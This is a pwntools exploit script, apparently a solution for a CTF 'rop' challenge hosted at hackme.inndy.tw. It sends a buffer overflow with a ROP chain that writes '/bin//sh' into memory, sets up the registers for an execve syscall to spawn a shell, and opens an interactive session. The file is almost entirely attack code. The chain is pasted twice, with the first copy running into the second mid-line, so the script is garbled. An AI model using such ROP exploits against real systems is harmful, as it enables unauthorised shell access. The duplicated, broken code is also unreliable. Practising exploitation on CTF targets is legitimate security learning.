from pwn import * 
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug') 
elf = ELF('/root/Desktop/CTF/rop') 


offset = 16 
io = remote('hackme.inndy.tw', 7704) 
p = 'A' * offset 
p += p32(0x0806ecda) # pop edx ; ret 
p += p32(0x080ea060) # @ .data 
p += p32(0x080b8016) # pop eax ; ret 
p += '/bin' 
p += p32(0x0805466b) # mov dword ptr [edx], eax ; ret 
p += p32(0x0806ecda) # pop edx ; ret 
p += p32(0x080ea064) # @ .data + 4 
p += p32(0x080b8016) # pop eax ; ret 
p += '//sh' 
p += p32(0x0805466b) # mov dword ptr [edx], eax ; ret 
p += p32(0x0806ecda) # pop edx ; ret 
p += p32(0x080ea068) # @ .data + 8 
p += p32(0x080492d3) # xor eax, eax ; ret 
p += p32(0x0805466b) # mov dword ptr [edx], eax ; ret 
p += p32(0x080481c9) # pop ebx ; ret 
p += p32(0x080ea060) # @ .data 
p += p32(0x080de769) # pop ecx ; ret 
p += p32(0x080ea068) # @ .data + 8 
p += p32(0x0806ecda) # pop edx ; ret 
p += p32(0x080ea068) # @ .data + 8 
p += p32(0x080492d3) # xor eax, eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0806c943) # int 0x80 p = 'A' * offset 
p += p32(0x0806ecda) # pop edx ; ret 
p += p32(0x080ea060) # @ .data 
p += p32(0x080b8016) # pop eax ; ret 
p += '/bin' 
p += p32(0x0805466b) # mov dword ptr [edx], eax ; ret 
p += p32(0x0806ecda) # pop edx ; ret 
##[0x080ea060]=[edx]='/bin'
p += p32(0x080ea064) # @ .data + 4 
p += p32(0x080b8016) # pop eax ; ret 
p += '//sh' 
p += p32(0x0805466b) # mov dword ptr [edx], eax ; ret 
p += p32(0x0806ecda) # pop edx ; ret 
p += p32(0x080ea068) # @ .data + 8 
##[0x080ea064]=[edx]='//sh'
p += p32(0x080492d3) # xor eax, eax ; ret 
p += p32(0x0805466b) # mov dword ptr [edx], eax ; ret 
p += p32(0x080481c9) # pop ebx ; ret 
p += p32(0x080ea060) # @ .data 
##ebx=0x080ea060 [ebx]='/bin//sh'
p += p32(0x080de769) # pop ecx ; ret 
p += p32(0x080ea068) # @ .data + 8 
##ecx=0x080ea068 [ecx]=0
p += p32(0x0806ecda) # pop edx ; ret 
p += p32(0x080ea068) # @ .data + 8 
##edx=0x080ea068 [edx]=0
p += p32(0x080492d3) # xor eax, eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
p += p32(0x0807a66f) # inc eax ; ret 
##eax=0x0b
io.sendline(p) 
io.interactive() 
io.close()

